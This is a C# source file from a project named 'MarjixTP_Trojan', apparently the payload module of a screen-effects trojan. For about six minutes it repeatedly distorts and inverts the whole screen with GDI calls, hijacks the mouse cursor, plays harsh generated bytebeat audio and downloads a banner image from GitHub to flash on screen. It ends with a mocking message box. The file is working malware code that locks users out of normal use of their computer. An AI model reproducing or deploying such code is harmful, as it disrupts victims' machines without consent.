using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Media;
using System.Linq.Expressions;
using System.Diagnostics.Eventing.Reader;
using System.Security.Principal;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Configuration;
using static MarjixTP_Trojan.DllImports;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.TextBox;
using System.Drawing.Drawing2D;
using System.Collections.Generic;
using System.Net.Http;

namespace MarjixTP_Trojan
{
    public static class FX
    {
        private static int currentMode = 0;
        private static bool ending = false;
        private static int time = 24;
        private static SoundPlayer soundP;
        private static int modeDelay = 1;

        private static async Task<Image> GetImageFromLinkAsync(string url)
        {
            using (HttpClient client = new HttpClient())
            {
                byte[] imgData = await client.GetByteArrayAsync(url);
                using (MemoryStream imgMemoryStream = new MemoryStream(imgData))
                {
                    return Image.FromStream(imgMemoryStream);
                }
            }
        }

        private static void ByteBeat(int currentBeat, int freq, bool stop)
        {
            if (stop)
            {
                if (soundP != null)
                {
                    soundP.Stop();
                }
            }
            else
            {
                using (var stream = new MemoryStream())
                {
                    var writer = new BinaryWriter(stream);

                    writer.Write("RIFF".ToCharArray());  // chunk id
                    writer.Write((UInt32)0);             // chunk size
                    writer.Write("WAVE".ToCharArray());  // format

                    writer.Write("fmt ".ToCharArray());  // chunk id
                    writer.Write((UInt32)16);            // chunk size
                    writer.Write((UInt16)1);             // audio format

                    var channels = 1;
                    var sample_rate = freq;
                    var bits_per_sample = 8;

                    writer.Write((UInt16)channels);
                    writer.Write((UInt32)sample_rate);
                    writer.Write((UInt32)(sample_rate * channels * bits_per_sample / 8)); // byte rate
                    writer.Write((UInt16)(channels * bits_per_sample / 8));               // block align
                    writer.Write((UInt16)bits_per_sample);

                    writer.Write("data".ToCharArray());

                    var seconds = time;

                    var data = new byte[sample_rate * seconds];

                    switch (currentBeat)
                    {
                        case 0:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)((byte)((t & t * 5 | t >> 6 | ((t & 0xFFFF) > 0x8000 ? (-6 * t) / 7 : ((t & 0x1FFFF) > 0x10000 ? -9 * t & 100 : (-9 * (t & 100))) / 11)) * 10));
                            break;
                        case 1:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(t * (((t & 4096) != 0 ? t % 65536 < 59392 ? 7 : t & 7 : 16) + (1 & t >> 14)) >> (3 & -t >> ((t & 2048) != 0 ? 2 : 10)));
                            break;
                        case 2:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(t / 8 >> (t >> 9) * t / ((t >> 14 & 3) + 4));
                            break;
                        case 3:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(((10 * (t >> 6 | t | t >> (t >> 16 & 3)) + (7 & t >> 11)) % 256 * ((t & 3072) != 0 ? (2048 + t % 4096) % 3072 / 12 : 0) >> 8) + ((t & 3072) != 0 ? 0 : (t % 256 * (1024 - t % 1024) / 3 >> 6 & 128) >> (t >> 8 & 15)));
                            break;
                        case 4:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(t + (t & t ^ t >> 6) - t * (t >> 9 & ((t % 16) != 0 ? 2 : 6) & t >> 9));
                            break;
                        case 5:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(((((t * ((t & 16384) != 0 ? 7 : 5) * (3 - (3 & (t >> 9)) + (3 & (t >> (((-t >> 20) & 1) != 0 ? 8 : 11)))) >> (3 & (-t >> ((t & ((-t & 57344) != 0 ? 4096 : 6144)) != 0 ? 2 : 16)))) | (((-t & 24576) != 0) ? ((3 * t >> 5) % 192) : ((t >> 4) % 192)) | (((t >> 20) & 1) != 0 ? (t >> 4) : (t >> (((-t >> 18) & 1) + 2)))) & 255) >> 1) - ((((t >> 18) & 1) != 0) ? ((((-t >> 1) * ((t & 16384) != 0 ? 7 : 5)) >> ((-t >> 10) & 3) & (t >> 4 & 255)) >> 1) : (((-t >> 2) * ((t & 16384) != 0 ? 7 : 5)) >> ((-t >> 10) & 3) & ((t >> 4 & 255) >> 1))) + (128 & (int)(40000 / (1 + (t & (((-t & 28672) != 0) ? 4095 : 2047))))) + ((((t >> 18) & 3) != 0) ? -(((t * (t ^ (t % 9))) & 255 & -(Convert.ToInt32((t >> ((t >> 11) & 31)) != 0 ? ((-t & 14336) != 0 ? 5 : 4) - Convert.ToInt32((-t & 28672) == 0) - Convert.ToInt32((-t & 122880) == 0) : 6)) << 2 & 255) >> 2) + 128 : 0));
                            break;
                        case 6:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(t * (-t >> (((t >> 13) % 8) + 2) & ((t >> 12) % 256)) / 4 + ((1048576 / ((t % 65536) | 1)) & 128));
                            break;
                        case 7:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)((((t >> 5 | t >> 4 | (t % 42 * (t >> 4) | 357052691 - (t >> 4)) / ((t >> 16) | 1) ^ (t | t >> 4)) & 255) + ((t % 25 - (t >> 2 | ((t & 16384) != 0 ? 64 / 3 : 16) * t | t % 227) - t >> 3 | (t >> 5 & 1663 * (t << 5) | (t >> 3) % 1544) / ((t % 17 | t % 2048) | 1)) & 255) + 100 * ((t << 2 | t >> 5 | t ^ 63) & (t << 10 | t >> 11)) % 256) / 3);
                            break;
                        case 8:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(t * t * 4 / (((5656 >> (t >> 12 & 14)) & 7) + 9) * (t >> 10 & 893) & t >> 4 ^ (((t >> 16 & 1) != 0 ? 0 : (t >> 10 & -t >> 14 & 3)) | (((t >> 9 & 1) + (t >> 12 & 7)) != 0 ? 0 : ((t % 4096) != 0 && (t / 9 & 8) == 0 ? 9001 / (t % 4096) : -1))));
                            break;
                        case 9:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(t * ((t >> 10 | t % 16 * t >> 8) & 8 * t >> 12 & 18));
                            break;
                        case 10:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(((t >> ((t >> 13) & 31)) & 128) + (((t & (t >> 12)) * t >> 12)) + (int)(300000.0 / (t % 16384 + 1)));
                            break;
                        case 11:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)((t & t / 2 & t / 4) * t / 4E3);
                            break;
                        case 12:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)(t * (t ^ t + (t >> 15 | 1) ^ (t - 1280 ^ t) >> 10));
                            break;
                        case 13:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)((t >> 8 | t >> 16) != 0 && (t % (t >> 8 | t >> 16)) != 0 ? t / (t % (t >> 8 | t >> 16)) : 0);
                            break;
                        case 14:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = data[t] = (byte)(((t * ((t & 8192) != 0 ? 7 : 5) * (6 - (3 & t >> 8) + (3 & t >> 9))) >> (3 & -t >> ((t & 2048) != 0 ? 2 : 11))));
                            break;
                        case 15:
                            for (var t = 0; t < data.Length; t++)
                                data[t] = (byte)((((2 * t & 255) * (-t >> 6 & t >> 7)) >> 8) | (t & t >> 1) | (t & t >> 1));
                            break;
                    }

                    writer.Write((UInt32)(data.Length * channels * bits_per_sample / 8));

                    foreach (var elt in data) writer.Write(elt);

                    writer.Seek(4, SeekOrigin.Begin);                     // seek to header chunk size field
                    writer.Write((UInt32)(writer.BaseStream.Length - 8)); // chunk size

                    stream.Seek(0, SeekOrigin.Begin);

                    soundP = new SoundPlayer(stream);
                    soundP.Play();
                }
            }
        }

        private static void ModeTypes()
        {
            while (!ending)
            {
                switch (currentMode)
                {
                    case 0:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 1:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 2:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 3:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 4:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 5:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 6:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 7:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 8:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 9:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 10:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 11:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 12:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 13:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 14:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    case 15:
                        Thread.Sleep(time * 1000);
                        currentMode += 1;
                        break;
                    default:
                        ending = true;
                        break;
                }
            }
        }

        public static void MTPMain()
        {
            Thread.Sleep(800);

            Task.Run(ModeTypes);

            int currentByteBeat = -1;

            Task.Run(() =>
            {
                int updateMode1 = currentMode;
                while (true)
                {
                    if (currentByteBeat != currentMode)
                    {
                        ByteBeat(0, 0, true);
                        currentByteBeat = currentMode;
                        if (currentMode != updateMode1)
                        {
                            updateMode1 = currentMode;
                            Thread.Sleep(modeDelay * 1000);
                        }
                        switch (currentByteBeat)
                        {
                            case 0:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 1:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 2:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 3:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 4:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 5:
                                ByteBeat(currentByteBeat, 11025, false);
                                break;
                            case 6:
                                ByteBeat(currentByteBeat, 44100, false);
                                break;
                            case 7:
                                ByteBeat(currentByteBeat, 9500, false);
                                break;
                            case 8:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 9:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 10:
                                ByteBeat(currentByteBeat, 44100, false);
                                break;
                            case 11:
                                ByteBeat(currentByteBeat, 44100, false);
                                break;
                            case 12:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 13:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 14:
                                ByteBeat(currentByteBeat, 8000, false);
                                break;
                            case 15:
                                ByteBeat(currentByteBeat, 32000, false);
                                break;
                        }
                    }
                }
            });

            Random r = new Random();
            List<IntPtr> iconBytes = new List<IntPtr>();
            for (var i = 0; i < 200; i++)
            {
                Icon ic = ExtractIcon("imageres.dll", r.Next(200), true);
                if (ic != null)
                {
                    if (ic.Handle != null)
                    {
                        if (ic.Handle != IntPtr.Zero)
                        {
                            if (!ic.Size.IsEmpty)
                            {
                                iconBytes.Add(ic.ToBitmap().GetHbitmap());
                            }
                        }
                    }
                }
            }
            bool couldGetMarjImages = false;
            var marjImgBan = GetImageFromLinkAsync("https://raw.githubusercontent.com/HGthepublisher/MarjixTP/refs/heads/main/marjtpbanner.png");
            if (marjImgBan.IsCompleted & !marjImgBan.IsCanceled & !marjImgBan.IsFaulted & marjImgBan.Result != null)
            {
                couldGetMarjImages = true;
            }
            int x = Screen.PrimaryScreen.Bounds.Width, y = Screen.PrimaryScreen.Bounds.Height;
            int case4Up = 0, case4Down = y, case4Left = 0, case4Right = x;
            int updateMode = currentMode;
            int x8 = x;
            bool rev8 = false;
            int x9 = 0;
            bool rev9 = false;
            int curs10x = 0, curs10y = 0;
            bool curs10db = false;
            IntPtr[] hBitmaps12 =
            {
                iconBytes[r.Next(iconBytes.Count)],
                iconBytes[r.Next(iconBytes.Count)],
                iconBytes[r.Next(iconBytes.Count)],
            };
            IntPtr[] hBitmaps11 =
            {
                iconBytes[r.Next(iconBytes.Count)],
                iconBytes[r.Next(iconBytes.Count)],
                iconBytes[r.Next(iconBytes.Count)],
            };
            int cursx14 = 0, cursy14 = 0;
            while (!ending)
            {
                int mainMouseX = Cursor.Position.X, mainMouseY = Cursor.Position.Y;
                if (currentMode != updateMode)
                {
                    updateMode = currentMode;
                    Thread.Sleep(modeDelay * 1000);
                }
                IntPtr hdc = GetDC(IntPtr.Zero);
                IntPtr Brush = CreateSolidBrush(0xFFFFFF);
                if (currentMode == updateMode)
                {
                    switch (currentMode)
                    {
                        case 0:
                            SelectObject(hdc, Brush);
                            PatBlt(hdc, 0, 0, x, y, TernaryRasterOperations.PATINVERT);
                            BitBlt(hdc, 0, 0, x, y, hdc, r.Next(-10, 10), r.Next(-25, 25), TernaryRasterOperations.SRCCOPY);
                            DeleteObject(Brush);
                            DeleteDC(hdc);
                            SetCursorPos(r.Next(x), r.Next(y));
                            Thread.Sleep(5);
                            break;
                        case 1:
                            SelectObject(hdc, Brush);
                            StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x - 4, y + 3, TernaryRasterOperations.SRCCOPY);
                            DeleteObject(Brush);
                            DeleteDC(hdc);
                            SetCursorPos(mainMouseX + r.Next(-25, 25), mainMouseY + r.Next(-25, 25));
                            Thread.Sleep(3);
                            break;
                        case 2:
                            SelectObject(hdc, Brush);
                            BitBlt(hdc, 0, 0, x, y, hdc, 0, -10, TernaryRasterOperations.SRCCOPY);
                            DeleteObject(Brush);
                            DeleteDC(hdc);
                            SetCursorPos(mainMouseX, mainMouseY + 10);
                            Thread.Sleep(1);
                            break;
                        case 3:
                            int re = r.Next(255), gr = r.Next(255), bl = r.Next(255);
                            uint brushColor = (uint)((bl << 16) | (gr << 8) | re);
                            IntPtr BrushCase3 = CreateSolidBrush(brushColor);
                            SelectObject(hdc, BrushCase3);
                            Ellipse(hdc, r.Next(x), r.Next(y), r.Next(x), r.Next(y));
                            DeleteObject(BrushCase3);
                            DeleteDC(hdc);
                            SetCursorPos(0, 0);
                            Thread.Sleep(15);
                            break;
                        case 4:
                            int re1 = r.Next(255), gr1 = r.Next(255), bl1 = r.Next(255);
                            uint brushColor1 = (uint)((bl1 << 16) | (gr1 << 8) | re1);
                            IntPtr BrushCase4 = CreateSolidBrush(brushColor1);
                            if (case4Up <= y)
                            {
                                case4Up += 8;
                            }
                            else
                            {
                                case4Up = 0;
                            }
                            if (case4Left <= x)
                            {
                                case4Left += 8;
                            }
                            else
                            {
                                case4Left = 0;
                            }
                            if (case4Down >= 0)
                            {
                                case4Down -= 8;
                            }
                            else
                            {
                                case4Down = y;
                            }
                            if (case4Right >= 0)
                            {
                                case4Right -= 8;
                            }
                            else
                            {
                                case4Right = x;
                            }
                            SelectObject(hdc, BrushCase4);
                            Rectangle(hdc, case4Left, case4Up, case4Right, case4Down);
                            DeleteObject(BrushCase4);
                            DeleteDC(hdc);
                            SetCursorPos(case4Right, case4Down);
                            break;
                        case 5:
                            IntPtr memDC = CreateCompatibleDC(hdc);
                            IntPtr hBitmap = iconBytes[r.Next(iconBytes.Count)];
                            SelectObject(memDC, hBitmap);
                            for (int i = 0; i < 25; i++)
                            {
                                StretchBlt(hdc, 0, 0, x, y, memDC, 0, 0, r.Next(x), r.Next(y), TernaryRasterOperations.SRCCOPY);
                            }
                            SelectObject(hdc, memDC);
                            DeleteDC(hdc);
                            DeleteDC(memDC);
                            SetCursorPos(x / 2 + r.Next(-50, 50), y / 2 + r.Next(-50, 50));
                            Thread.Sleep(25);
                            break;
                        case 6:
                            SelectObject(hdc, Brush);
                            BitBlt(hdc, 0, 0, x, y, hdc, r.Next(-80, 80), r.Next(-80, 80), TernaryRasterOperations.SRCCOPY);
                            DeleteObject(Brush);
                            DeleteDC(hdc);
                            SetCursorPos(r.Next(x), r.Next(y));
                            break;
                        case 7:
                            IntPtr hdc2 = CreateCompatibleDC(hdc);
                            IntPtr hbit = CreateCompatibleBitmap(hdc, x, y);
                            IntPtr selc = SelectObject(hdc2, hbit);
                            Rectangle(hdc, r.Next(x), r.Next(y), r.Next(x), r.Next(y));
                            Ellipse(hdc, r.Next(x), r.Next(y), r.Next(x), r.Next(y));
                            BitBlt(hdc2, 0, 0, x, y, hdc, 0, 0, TernaryRasterOperations.SRCCOPY);
                            AlphaBlend(hdc, r.Next(-20, 20), r.Next(-20, 20), x, y, hdc2, 0, 0, x, y, new BLENDFUNCTION(0, 0, 30, 0));
                            SelectObject(hdc2, selc);
                            DeleteObject(selc);
                            DeleteObject(hbit);
                            DeleteDC(hdc);
                            DeleteDC(hdc2);
                            SetCursorPos(x / 2, mainMouseY);
                            Thread.Sleep(1);
                            break;
                        case 8:
                            if (x8 < x/2)
                            {
                                rev8 = false;
                            }
                            if (x8 > x/2*3)
                            {
                                rev8 = true;
                            }
                            if (rev8)
                            {
                                x8 -= 5;
                            }
                            else
                            {
                                x8 += 5;
                            }
                            SelectObject(hdc, Brush);
                            StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x8, y, TernaryRasterOperations.SRCCOPY);
                            DeleteDC(hdc);
                            DeleteObject(Brush);
                            SetCursorPos(-mainMouseX + x, -mainMouseY + y);
                            break;
                        case 9:
                            if (x9 > x)
                            {
                                rev9 = true;
                            }
                            if (x9 < -x)
                            {
                                rev9 = false;
                            }
                            if (rev9)
                            {
                                x9 -= 10;
                            }
                            else
                            {
                                x9 += 10;
                            }
                            int re9 = r.Next(255), gr9 = r.Next(255), bl9 = r.Next(255);
                            uint brushColor9 = (uint)((bl9 << 16) | (gr9 << 8) | re9);
                            IntPtr hatchBrush9 = CreateHatchBrush(2, brushColor9);
                            SelectObject(hdc, hatchBrush9);
                            PatBlt(hdc, x9, 0, x, y, TernaryRasterOperations.PATINVERT);
                            DeleteObject(Brush);
                            DeleteDC(hdc);
                            SetCursorPos(mainMouseY, mainMouseX);
                            break;
                        case 10:
                            Task.Run(() =>
                            {
                                if (!curs10db)
                                {
                                    curs10db = true;
                                    SetCursorPos(0, 0);
                                    Thread.Sleep(2);
                                    SetCursorPos(x, 0);
                                    Thread.Sleep(2);
                                    SetCursorPos(x, y);
                                    Thread.Sleep(2);
                                    SetCursorPos(0, y);
                                    curs10db = false;
                                }
                            });
                            IntPtr brush10 = CreateSolidBrush(0xFFFFFF);
                            if (r.Next(2) == 1)
                            {
                                brush10 = CreateSolidBrush(0x0000FF);
                            }
                            else
                            {
                                brush10 = CreateSolidBrush(0xFF9900);
                            }
                            SelectObject(hdc, brush10);
                            BitBlt(hdc, 0, 0, x, y, hdc, x, y, TernaryRasterOperations.PATINVERT);
                            IntPtr newhdc = CreateCompatibleDC(hdc);
                            SelectObject(hdc, Brush);
                            StretchBlt(hdc, 0, 0, x, y, hdc, 0, 0, x, y + 10, TernaryRasterOperations.SRCCOPY);
                            DeleteObject(brush10);
                            DeleteObject(Brush);
                            DeleteDC(hdc);
                            Thread.Sleep(2);
                            break;
                        case 11:
                            IntPtr brush11 = CreatePatternBrush(hBitmaps11[r.Next(hBitmaps11.Length)]);
                            SelectObject(hdc, brush11);
                            PatBlt(hdc, 0, 0, x, y, TernaryRasterOperations.PATCOPY);
                            IntPtr brush112 = CreateSolidBrush(0xFFFFFF);
                            if (r.Next(2) == 1)
                            {
                                brush112 = CreateSolidBrush(0x00FF00);
                            }
                            else
                            {
                                brush112 = CreateSolidBrush(0xFF00FF);
                            }
                            SelectObject(hdc, brush112);
                            BitBlt(hdc, 0, 0, x, y, hdc, x, y, TernaryRasterOperations.PATINVERT);
                            DeleteDC(hdc);
                            DeleteObject(brush11);
                            DeleteObject(brush112);
                            Thread.Sleep(2);
                            break;
                        case 12:
                            IntPtr brush12 = CreatePatternBrush(hBitmaps12[r.Next(hBitmaps12.Length)]);
                            SelectObject(hdc, brush12);
                            PatBlt(hdc, 0, 0, x, y, TernaryRasterOperations.PATCOPY);
                            Thread.Sleep(25);
                            SelectObject(hdc, Brush);
                            BitBlt(hdc, 0, 0, x, y, hdc, r.Next(-35, 35), r.Next(-20, 20), TernaryRasterOperations.SRCCOPY);
                            DeleteDC(hdc);
                            DeleteObject(brush12);
                            DeleteObject(Brush);
                            SetCursorPos(x, y);
                            Thread.Sleep(25);
                            break;
                        case 13:
                            SelectObject(hdc, Brush);
                            int r2 = r.Next(x);
                            BitBlt(hdc, r2, r.Next(20), r.Next(100), y, hdc, r2, 0, TernaryRasterOperations.SRCCOPY);
                            DeleteObject(Brush);
                            DeleteDC(hdc);
                            SetCursorPos(mainMouseX, mainMouseY + r.Next(-10, 25));
                            break;
                        case 14:
                            if (cursx14 <= 0)
                            {
                                cursx14 = x;
                            }
                            if (cursy14 >= y)
                            {
                                cursy14 = 0;
                            }
                            cursx14 -= 200;
                            cursy14 += 200;
                            SetCursorPos(cursx14, cursy14);
                            IntPtr brush14 = CreateHatchBrush(3, 0xF0A040);
                            SelectObject(hdc, brush14);
                            PatBlt(hdc, r.Next(-2, 2), r.Next(-2, 2), x, y, TernaryRasterOperations.PATINVERT);
                            SelectObject(hdc, Brush);
                            int r3 = r.Next(x);
                            BitBlt(hdc, r.Next(200), r3, x, r.Next(-100, 100), hdc, 0, r3, TernaryRasterOperations.SRCCOPY);
                            DeleteDC(hdc);
                            DeleteObject(brush14);
                            DeleteObject(Brush);
                            Thread.Sleep(1);
                            break;
                        case 15:
                            if (marjImgBan.IsCompleted & !marjImgBan.IsCanceled & !marjImgBan.IsFaulted & marjImgBan.Result != null)
                            {
                                IntPtr memDC2 = CreateCompatibleDC(hdc);
                                Bitmap marjBit = new Bitmap(marjImgBan.Result);
                                IntPtr hBitmap2 = marjBit.GetHbitmap();
                                SelectObject(hdc, Brush);
                                BitBlt(hdc, 0, 0, x, y, hdc, r.Next(-4, 4), r.Next(-4, 4), TernaryRasterOperations.SRCINVERT);
                                SelectObject(memDC2, hBitmap2);
                                SelectObject(hdc, memDC2);
                                StretchBlt(hdc, 0, 0, x, y, memDC2, 0, 0, marjBit.Width, marjBit.Height, TernaryRasterOperations.SRCINVERT);
                                DeleteDC(hdc);
                                DeleteDC(memDC2);
                                DeleteObject(Brush);
                            }
                            Thread.Sleep(5);
                            break;
                    }
                }
            }
            ByteBeat(0, 0, true);

            Thread.Sleep(800);

            MessageBox.Show("Alright, I'm done now. I must go, use your computer wisely. Peace out!!", "Thanks for using again!!", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
    }
}